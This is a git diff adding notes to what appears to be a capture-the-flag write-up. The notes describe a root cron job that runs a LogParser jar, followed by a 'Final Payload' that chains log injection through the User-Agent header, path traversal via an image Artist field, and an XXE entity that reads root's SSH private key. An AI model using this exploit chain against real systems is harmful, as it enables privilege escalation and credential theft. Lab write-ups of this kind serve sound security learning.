@@ -157,4 +157,51 @@ public void afterCompletion(HttpServletRequest request, HttpServletResponse resp
     bw.write(responseCode.toString() + "||" + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "\n");
     bw.close();
   }
-``` 
+```
+
+### LogParser jar
+/opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
+
+12:56:01
+12:58:01 ---> Every two minutes, LogParser run
+
+2022/08/08 12:56:01 CMD: UID=0    PID=3393   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
+2022/08/08 12:56:01 CMD: UID=0    PID=3392   | /bin/sh /root/run_credits.sh 
+2022/08/08 12:56:01 CMD: UID=0    PID=3391   | /bin/sh -c /root/run_credits.sh 
+2022/08/08 12:56:01 CMD: UID=0    PID=3390   | /usr/sbin/CRON -f 
+2022/08/08 12:56:01 CMD: UID=0    PID=3407   | /lib/systemd/systemd-udevd 
+2022/08/08 12:56:01 CMD: UID=0    PID=3413   | /lib/systemd/systemd-udevd 
+2022/08/08 12:56:01 CMD: UID=0    PID=3412   | /lib/systemd/systemd-udevd
+
+
+### Final Payload
+- Create an image (a.jpg) with: `Artist: ../dev/shm/a`
+- Create an xml (a_creds.xml) with: 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY file SYSTEM "file:///root/.ssh/id_rsa"> ]>
+<credits>
+  <foo>&file;</foo>
+  <author>a</author>
+  <image>
+    <uri>/../../../../../../dev/shm/a.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/hungy.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smooch.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smiley.jpg</uri>
+    <views>0</views>
+  </image>
+  <totalviews>0</totalviews>
+</credits>
+
+```
+- Request: `User-Agent: Mozilla/5.0||/../../../../../../dev/shm/a.jpg`
+- Wait until LogParser is executed and see the a_creds.xml file
